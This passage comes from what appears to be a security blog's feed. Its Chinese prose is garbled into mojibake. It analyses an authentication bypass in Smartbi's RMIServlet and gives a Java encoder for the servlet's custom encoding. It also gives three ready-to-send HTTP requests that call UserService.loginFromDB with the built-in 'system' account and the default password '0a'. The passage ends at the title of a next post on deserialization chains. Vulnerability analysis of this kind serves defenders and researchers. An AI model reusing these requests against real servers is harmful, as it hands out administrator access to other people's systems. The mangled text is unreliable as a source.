æ¥ä¸‹æ¥ï¼Œä½¿ç”¨<code>StringUtil.isNullOrEmpty(algorithName)</code>æ–¹æ³•åˆ¤æ–­algorithNameæ˜¯å¦ä¸ºç©ºæˆ–è€…ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨<code>CommonUtil.getNetWorkAlgorithmByJDBC()</code>æ–¹æ³•è·å–ç½‘ç»œç®—æ³•åç§°ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™algorithNameã€‚å†æ¬¡åˆ¤æ–­algorithNameæ˜¯å¦ä¸ºç©ºæˆ–è€…ç©ºå­—ç¬¦ä¸²ã€‚å¦‚æœæ˜¯ï¼Œåˆ™å°†algorithNameè®¾ç½®ä¸ºé»˜è®¤å€¼â€SF1â€³ã€‚</p><p>â€‹       ç„¶åï¼Œé€šè¿‡<code>codersMap.get(algorithName)</code>æ–¹æ³•ä»codersMapä¸­è·å–å¯¹åº”çš„ICoderå¯¹è±¡ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™å˜é‡coderã€‚</p><p>â€‹       æ¥ç€åˆ¤æ–­coderæ˜¯å¦ä¸ºç©ºã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™è®°å½•é”™è¯¯æ—¥å¿—ï¼Œå¹¶å°†algorithNameé‡æ–°è®¾ç½®ä¸ºé»˜è®¤å€¼â€SF1â€³ã€‚ç„¶åå†æ¬¡é€šè¿‡<code>codersMap.get(algorithName)</code>æ–¹æ³•ä»codersMapä¸­è·å–å¯¹åº”çš„ICoderå¯¹è±¡ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™coderã€‚</p><p>â€‹       æœ€åï¼Œè¿”å›coderä½œä¸ºç»“æœã€‚</p><p>â€‹       æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šé¢çš„åŠ å¯†æ–¹å¼æ„é€ ä¸€ä¸ªå¯¹ç§°çš„encodeåŠ å¯†æ–¹å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.google.common.primitives.Bytes;<br><span class="hljs-keyword">import</span> smartbi.util.codeutil.CodeHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">t</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encodeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">56</span>, <span class="hljs-number">97</span>, <span class="hljs-number">89</span>, <span class="hljs-number">84</span>, <span class="hljs-number">43</span>, <span class="hljs-number">0</span>, <span class="hljs-number">103</span>, <span class="hljs-number">106</span>, <span class="hljs-number">37</span>, <span class="hljs-number">113</span>, <span class="hljs-number">49</span>, <span class="hljs-number">121</span>, <span class="hljs-number">78</span>, <span class="hljs-number">114</span>, <span class="hljs-number">112</span>, <span class="hljs-number">110</span>, <span class="hljs-number">48</span>, <span class="hljs-number">76</span>, <span class="hljs-number">55</span>, <span class="hljs-number">123</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">88</span>, <span class="hljs-number">120</span>, <span class="hljs-number">115</span>, <span class="hljs-number">41</span>, <span class="hljs-number">77</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">104</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">54</span>, <span class="hljs-number">51</span>, <span class="hljs-number">65</span>, <span class="hljs-number">33</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">68</span>, <span class="hljs-number">90</span>, <span class="hljs-number">66</span>, <span class="hljs-number">83</span>, <span class="hljs-number">122</span>, <span class="hljs-number">81</span>, <span class="hljs-number">86</span>, <span class="hljs-number">93</span>, <span class="hljs-number">0</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">102</span>, <span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">119</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">126</span>, <span class="hljs-number">45</span>, <span class="hljs-number">118</span>, <span class="hljs-number">100</span>, <span class="hljs-number">99</span>, <span class="hljs-number">82</span>, <span class="hljs-number">116</span>, <span class="hljs-number">75</span>, <span class="hljs-number">57</span>, <span class="hljs-number">39</span>, <span class="hljs-number">79</span>, <span class="hljs-number">101</span>, <span class="hljs-number">46</span>, <span class="hljs-number">72</span>, <span class="hljs-number">42</span>, <span class="hljs-number">67</span>, <span class="hljs-number">50</span>, <span class="hljs-number">74</span>, <span class="hljs-number">111</span>, <span class="hljs-number">70</span>, <span class="hljs-number">95</span>, <span class="hljs-number">85</span>, <span class="hljs-number">58</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">98</span>, <span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">byte</span>[] ret =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encodeArray.length];<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-type">byte</span> i: encodeArray)&#123;<br>            <span class="hljs-keyword">if</span> (i&gt;<span class="hljs-number">0</span>)&#123;<br>                ret[i] = (<span class="hljs-type">byte</span>)Bytes.indexOf(encodeArray,i);<br>            &#125;<br>        &#125;<br>        encodeArray = ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encode(<span class="hljs-type">byte</span>[] dataByte) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; dataByte.length; ++j) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> dataByte[i];<br>            <span class="hljs-keyword">if</span> (tmp != <span class="hljs-number">0</span> &amp;&amp; tmp &lt; encodeArray.length) &#123;<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">decodeChar</span> <span class="hljs-operator">=</span> encodeArray[tmp];<br>                <span class="hljs-keyword">if</span> (decodeChar != <span class="hljs-number">0</span>) &#123;<br>                    dataByte[i] = decodeChar;<br>                &#125;<br>            &#125;<br><br>            ++i;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dataByte;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        test();<br>        <span class="hljs-type">byte</span>[] dataByte = CodeHandler.strToByteArrayByUTF8(<span class="hljs-string">&quot;%5B%22system%22%2C%220a%22%5D&quot;</span>);<br>        dataByte = encode(dataByte);<br><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span> (dataByte));<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹       è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬ç”¨è‡ªå®šä¹‰çš„encodeæ–¹æ³•åŠ å¯†å‡ºæ¥çš„æ•°æ®å’Œå†…ç½®çš„decodeæ–¹æ³•è§£å¯†å‡ºæ¥çš„æ•°æ®å°±æ˜¯å¯¹ç§°çš„äº†ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" alt="img"></p><p>â€‹       é€šè¿‡ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å†…éƒ¨æ¥æ”¶ä¸‰ä¸ªå‚æ•°<code>className</code>ã€<code>methodName</code>å’Œ<code>params</code>è€Œä¸”å¿…é¡»é€šè¿‡å‚æ•°<code>windowUnloading</code>è¿™ä¸ªå‚æ•°è¿›è¡Œä¼ å…¥ï¼Œä¼ å…¥ä¹‹åä¼šå¯¹å…¶è¿›è¡Œè§£ç ã€‚</p><p><code>className</code>ï¼š UserService</p><p><code>methodName</code>ï¼šloginFromDB</p><p><code>params</code>ï¼š[â€œsystemâ€,â€0aâ€]</p><p>â€‹       æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æŒ‰é¡ºåºè¿›è¡Œè‡ªå®šä¹‰ç¼–ç è¿›è¡Œä¼ å…¥å³å¯ã€‚æ•…æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3<br><br><span class="language-abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><p>â€‹       çœ‹åˆ°è¿™é‡Œå¯èƒ½æœ‰äººä¼šé—®ï¼Œä½ éƒ½å·²ç»é€šè¿‡GETæ–¹å¼ä¼ å…¥<code>windowUnloading</code>äº†ä¸ºä»€ä¹ˆè¦æŠŠåŒ…å˜æˆPOSTï¼Ÿæˆ‘ä»¬å¯ä»¥å…ˆå¸¦ç€é—®é¢˜å¾€ä¸‹çœ‹ã€‚</p><p>â€‹       åœ¨æ¥æ”¶åˆ°å‚æ•°åç¨‹åºä¼šæ¥åˆ°é‰´æƒè¿™ä¸€æ­¥ï¼Œæ¥åˆ¤æ–­æˆ‘ä»¬æ˜¯å¦å·²ç»ç™»å½•ï¼Œæ‰€ä»¥ä¼šè·³åˆ°è¿™ä¸ª<code>needToCheck()</code>æ–¹æ³•ä¸­ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" alt="img"></p><p>â€‹       é‚£æˆ‘ä»¬å†è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ª<code>needToCheck()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/09dc2408629a1e3c90c1d91f53543788.png" alt="img"></p><p>â€‹       å¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>needToCheck()</code>å†…éƒ¨æ˜¯å¯¹ç™½åå•çš„æ£€éªŒï¼Œä¸€æ—¦å‚æ•°ç¬¦åˆè¦æ±‚å°±è¿”å›falseï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸ä¼šè¿›å…¥åˆ°ä¸Šé¢çš„å†æ¬¡éªŒè¯æ˜¯å¦ç™»å½•çš„æ“ä½œã€‚</p><p>â€‹      å› ä¸ºæˆ‘ä»¬æ˜¯ä»¥POSTçš„æ–¹å¼æäº¤çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šæ¥åˆ°<code>doPost</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/36bb69fb62eb7d6c83e26b16cff0d3ce.png" alt="img"></p><p>â€‹       ä¹‹åä¼šå°†æˆ‘ä»¬æäº¤çš„<code>params</code>é‡Œé¢çš„å€¼ä¼šæ¥æ”¶ä¼ å…¥<code>loginFromDB()</code>ï¼Œè‹¥ç™»å½•æˆåŠŸåˆ™ä¼šè¿”å›<strong>loginSucceed</strong></p><p><img src="https://ice.frostsky.com/2023/08/15/6f059f4cbea86b95a603045f81e21e7e.md.png" alt="img"></p><p>â€‹       æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå°±æ¸…æ¥šäº†æ¼æ´çš„æˆå› ï¼Œå…ˆè¿›è¡Œç™½åå•æ£€éªŒç»•è¿‡ï¼Œç„¶åé€šè¿‡<code>params</code>é‡Œé¢ä¼ å…¥çš„ä¸¤ä¸ªå€¼åˆ†åˆ«æ˜¯å†…ç½®ç”¨æˆ·çš„è´¦å·å’Œå¯†ç è¿›è¡Œç™»å½•ã€‚</p><p>â€‹       </p><p>â€‹       åœ¨è¿™ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆæ•°æ®è¦é€šè¿‡POSTä¼ å…¥ï¼Ÿ</p><p>â€‹       æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></td></tr></table></figure><p>â€‹       ä¹‹å‰çš„æµç¨‹éƒ½æ˜¯å¤§å·®ä¸å·®çš„ï¼Œä»–è™½ç„¶ä¹Ÿä¼šç»•è¿‡ä¹‹å‰çš„<code>needToCheck()</code>ï¼Œä½†æ˜¯GETè¯·æ±‚ä¼šæ¥åˆ°<code>doGet</code>é‡Œé¢ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/68fe5752b51f9481255ee7705e53e6fb.png" alt="img"></p><p>â€‹       <code>doGet</code>å¾ˆç®€å•ï¼Œé¦–å…ˆåˆ¤æ–­è¯·æ±‚è·¯å¾„æ˜¯å¦ä»¥**.js.stub<strong>ç»“å°¾å¦‚æœä¸æ˜¯åˆ™ä¼šæŠ¥</strong>Invalid URL**</p><p>â€‹       å°±ç®—æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•ç»•è¿‡è¿™ä¸€æ­¥ï¼Œä»–åé¢ä¹Ÿåªæ¥æ”¶ä¸€ä¸ªå‚æ•°<code>className</code>æ‰€ä»¥æ ¹æœ¬è¾¾ä¸åˆ°åˆ©ç”¨çš„æ•ˆæœï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç”¨POSTè€Œä¸ç”¨GETçš„åŸå› äº†ã€‚è‡³äºPOSTçš„æ•°æ®å¯ä»¥éšæ„æ„é€ ã€‚</p><p>â€‹       é‚£ä¹ˆæœ‰äººä¼šé—®ä½ ä¼ å…¥çš„è¿™ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>â€‹        å‰ä¸¤ä¸ªçœ‹äº†ä»£ç ä¹‹åå¾ˆå¥½ç†è§£å§ï¼Œä»–ä»¬ä¸¤ä¸ªçš„ç›®çš„å°±æ˜¯ä¸ºäº†ç»•è¿‡å†æ¬¡éªŒè¯ç”¨æˆ·æ˜¯å¦ç™»å½•ã€‚é‚£ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­ä¼ å…¥çš„â€systemâ€å’Œâ€0aâ€åˆ†åˆ«æ˜¯å†…ç½®ç”¨æˆ·çš„è´¦æˆ·å’Œå¯†ç ã€‚ä¸€å…±æœ‰ä¸‰ä¸ªé»˜è®¤è´¦æˆ·ï¼Œæœ¬æ–‡ä»…ç”¨systemä¸¾ä¾‹ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…ä¹Ÿå¯ä»¥è¯•è¯•å…¶ä»–ä¸¤ä¸ªï¼Œä½†æ˜¯ä»–ä»¬çš„é»˜è®¤å¯†ç éƒ½æ˜¯â€œ0aâ€ã€‚</p><p>â€‹       é‚£æˆ‘ä»¬å†æ¥è®²å’Œ<strong>ç¬¬ä¸€ç§</strong>æ¯”è¾ƒç›¸ä¼¼çš„<strong>ç¬¬ä¸‰ç§</strong>ä¼ å‚æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç”¨<code>encode</code>çš„æ–¹å¼ä¼ å…¥ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/c27882fe048ddfbbbcea101baf5b478d.png" alt="img"></p><p>â€‹       ä»–ä¸ç®¡æ˜¯æ¥æ”¶è¿˜æ˜¯å¤„ç†æ–¹å¼éƒ½å’Œç¬¬ä¸€ç§å¾ˆåƒï¼Œåªä¸è¿‡ä»–æ˜¯é€šè¿‡POSTçš„æäº¤ï¼Œä¹‹åä¹Ÿæ˜¯å…ˆç»•è¿‡<code>needToCheck()</code>æ–¹æ³•ï¼Œè¿›å…¥<code>doPost</code>-&gt;<code>loginFromDB()</code>ï¼Œè¿”å›<strong>loginSucceed</strong>ã€‚</p><p>â€‹       æˆ‘æä¾›ä¸€ä¸‹æˆ‘çš„payloadï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>60<br><br><span class="language-awk">encode=zDp4Wp4gRip+Sw-R6x4wdTV+<span class="hljs-regexp">/JV/uu</span>D2Dkpd<span class="hljs-regexp">/uu/u</span>t<span class="hljs-regexp">/uu7(/uu</span><span class="hljs-regexp">/JT</span></span><br></code></pre></td></tr></table></figure><p>â€‹       é‚£ä¹ˆæˆ‘ä»¬å†çœ‹ç¬¬äºŒç§ï¼Œç›´æ¥ç”¨POSTçš„æ–¹å¼ä¼ å…¥ï¼Œè¿™ç§æ–¹å¼æ˜¯æœ€ç®€å•ç›´æ¥çš„ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/8a25d1b1fa4f397f9a1590ef59962264.png" alt="img"></p><p>â€‹       ä»–å…ˆä¼šæ¥æ”¶<code>className</code>å’Œ<code>methodName</code>è¿™ä¸¤ä¸ªç”¨äº<code>needToCheck</code>,å¦‚æœåç»­æ£€éªŒæ²¡é—®é¢˜ï¼Œä»–ä¹Ÿä¼šè¿›å…¥åˆ°doPOSTä¹‹ä¸­ï¼Œæœ€ç»ˆä¹Ÿä¼šæ¥æ”¶<code>params</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/3f3de12e65e7172678f06dce83f0c7f0.png" alt="img"></p><p>â€‹       ä¹‹åä¹Ÿæ˜¯åŒæ ·çš„å¤„ç†æ–¹å¼ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>â€‹       ä¸‹é™„postæ–¹å¼çš„payloadï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>67<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>â€”â€”ä¸åŠè·¬æ­¥æ— ä»¥è‡³åƒé‡Œï¼Œä¸ç§¯å°æµæ— ä»¥æˆæ±Ÿæ²³ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ezååºåˆ—åŒ–popé“¾æ„é€ æ€è·¯</title>
    <link href="/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/</url>
    
